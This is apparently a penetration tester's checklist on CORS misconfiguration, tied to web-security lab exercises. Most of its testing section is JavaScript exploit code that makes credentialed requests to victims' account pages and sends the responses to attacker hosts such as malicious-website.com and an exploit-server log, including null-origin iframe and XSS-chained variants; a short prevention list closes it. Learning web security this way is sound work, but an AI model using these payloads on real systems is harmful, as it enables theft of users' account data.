# CORS
## Overview

Cross-origin resource sharing (CORS) is a browser mechanism which enables controlled access to resources located outside of a given domain. It extends and adds flexibility to the same-origin policy (SOP). However, it also provides potential for cross-domain attacks, if a website's CORS policy is poorly configured and implemented. CORS is not a protection against cross-origin attacks such as cross-site request forgery (CSRF).

## Testing

- [ ] Test for basic origin reflection
    
    - [ ] Send an “Origin:” header with an arbitrary domain and see if it gets reflected

	```javascript
	<script>
	    var req = new XMLHttpRequest();
	    req.onload = reqListener;
	    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
	    req.withCredentials = true;
	    req.send();
	    
	    function reqListener() {
	        location='/log?key='+this.responseText;
	    };
	</script>
	```

Place this on your website to capture sensitive data in a response
    
	```javascript
	var req = new XMLHttpRequest();
	req.onload = reqListener;
	req.open('get','<https://vulnerable-website.com/sensitive-victim-data>',true);
	req.withCredentials = true;
	req.send();
	
	function reqListener() {
	    location='//malicious-website.com/log?key='+this.responseText;
	};
	```
    
- [ ] Check for errors in parsing Origin headers
    
    - [ ] Try different things - change [`normal-website.com`](http://normal-website.com) to:
        - [ ] `hackersnormal-website.com`
        - [ ] `normal-website.com.evil-website.com`
- [ ] Check for `null` origin value
    
    Steal sensitive data with the following script
    
	```jsx
	<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
	    var req = new XMLHttpRequest();
	    req.onload = reqListener;
	    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
	    req.withCredentials = true;
	    req.send();
	    function reqListener() {
	        location='YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
	    };
	</script>"></iframe>
	```
    
- [ ] Check for subdomains → `Origin: somesubdomain.site.com`
    
	```jsx
	<https://subdomain.vulnerable-website.com/?xss=><script>cors-stuff-here</script>
	```
    
- [ ] Check for insecure hosts trusted → `Origin: [<http://trusted-subdomain.vulnerable-website.com>](<http://trusted-subdomain.vulnerable-website.com/>)`
    
    If you find an XSS on a subdomain, use something like this.
    
	```jsx
	<script>
	    document.location="<http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4><script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','<https://YOUR-LAB-ID.web-security-academy.net/accountDetails>',true); req.withCredentials = true;req.send();function reqListener() {location='<https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key=>'%2bthis.responseText; };%3c/script>&storeId=1"
	</script>
	```
    
- [ ] Check for internal sites
    

## Prevention

- [ ] Only allow trusted sites
- [ ] Avoid whitelisting “null”
- [ ] Avoid wildcards in internal networks
- [ ] CORS defines browser behaviors and is not a substitute for server-side security